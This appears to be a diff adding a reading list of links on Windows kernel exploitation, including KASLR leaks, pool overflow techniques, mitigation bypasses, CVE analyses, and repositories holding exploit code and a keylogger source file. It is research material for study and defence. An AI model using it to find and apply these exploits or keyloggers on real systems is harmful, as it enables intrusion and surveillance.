+[https://starlabs.sg/blog/2025/03-cimfs-crashing-in-memory-finding-system-kernel-edition/](https://starlabs.sg/blog/2025/03-cimfs-crashing-in-memory-finding-system-kernel-edition/)
+
+[https://blog.slowerzs.net/posts/keyjumper/?utm_source=chatgpt.com](https://blog.slowerzs.net/posts/keyjumper/?utm_source=chatgpt.com)
+
+[https://github.com/Slowerzs/KeyJumper/blob/main/src/launcher/keylog.c](https://github.com/Slowerzs/KeyJumper/blob/main/src/launcher/keylog.c)
+
+[https://xacone.github.io/kaslr_leak_24h2.html](https://xacone.github.io/kaslr_leak_24h2.html)
+
+[https://devblogs.microsoft.com/oldnewthing/20210510-00/?p=105200&utm_source=chatgpt.com](https://devblogs.microsoft.com/oldnewthing/20210510-00/?p=105200&utm_source=chatgpt.com)
+
+[https://windows-internals.com/category/windows-internals/](https://windows-internals.com/category/windows-internals/)
+
+[https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/en/?utm_source=chatgpt.com](https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/en/?utm_source=chatgpt.com)
+
+[https://www.crowdfense.com/nt-os-kernel-information-disclosure-vulnerability-cve-2025-53136/?utm_source=chatgpt.com](https://www.crowdfense.com/nt-os-kernel-information-disclosure-vulnerability-cve-2025-53136/?utm_source=chatgpt.com)
+
+[https://jxy-s.github.io/herpaderping/res/DivingDeeper.html](https://jxy-s.github.io/herpaderping/res/DivingDeeper.html)
+
+[https://www.tiraniddo.dev/2020/02/dll-import-redirection-in-windows-10_8.html](https://www.tiraniddo.dev/2020/02/dll-import-redirection-in-windows-10_8.html)
+
+[https://projectzero.google/2017/08/bypassing-virtualbox-process-hardening.html](https://projectzero.google/2017/08/bypassing-virtualbox-process-hardening.html)
+
+[https://jle-k.com/blog/Exploiting+CVE-2026-21241#Bit-Manipulation%20Primitive](https://jle-k.com/blog/Exploiting+CVE-2026-21241#Bit-Manipulation%20Primitive)
+
+[https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/](https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/)
+
+[https://exploits.forsale/24h2-nt-exploit/](https://exploits.forsale/24h2-nt-exploit/)
+
+[https://github.com/exploits-forsale/prefetch-tool/blob/main/prefetch_tool/prefetch_leak.h](https://github.com/exploits-forsale/prefetch-tool/blob/main/prefetch_tool/prefetch_leak.h)
+
+[https://starlabs.sg/blog/2025/03-star-labs-windows-exploitation-challenge-2025-writeup/?utm_source=chatgpt.com](https://starlabs.sg/blog/2025/03-star-labs-windows-exploitation-challenge-2025-writeup/?utm_source=chatgpt.com)
+
+[https://insideyourkernel.com/2025-03-22-windows-11-x64-kernel-exploitation-nonpaged-pool-overflow-using-hevd-part-1-arbitrary-read.html?utm_source=chatgpt.com](https://insideyourkernel.com/2025-03-22-windows-11-x64-kernel-exploitation-nonpaged-pool-overflow-using-hevd-part-1-arbitrary-read.html?utm_source=chatgpt.com)
+
+[https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/blob/master/readme.md?utm_source=chatgpt.com](https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/blob/master/readme.md?utm_source=chatgpt.com)
+
+[https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/blob/master/exploits/CVE-2020-17087.cpp](https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/blob/master/exploits/CVE-2020-17087.cpp)
+
+[https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/](https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/)
+
+[https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-17087.html?utm_source=chatgpt.com](https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-17087.html?utm_source=chatgpt.com)
+
+[https://wiki.osdev.org/Paging](https://wiki.osdev.org/Paging)
+
+[https://0dr3f.github.io/Demystifying_Physical_Memory_Primitive_Exploitation_on_Windows](https://0dr3f.github.io/Demystifying_Physical_Memory_Primitive_Exploitation_on_Windows)
+
+[https://blog.xenoscr.net/2021/09/06/Exploring-Virtual-Memory-and-Page-Structures.html](https://blog.xenoscr.net/2021/09/06/Exploring-Virtual-Memory-and-Page-Structures.html)
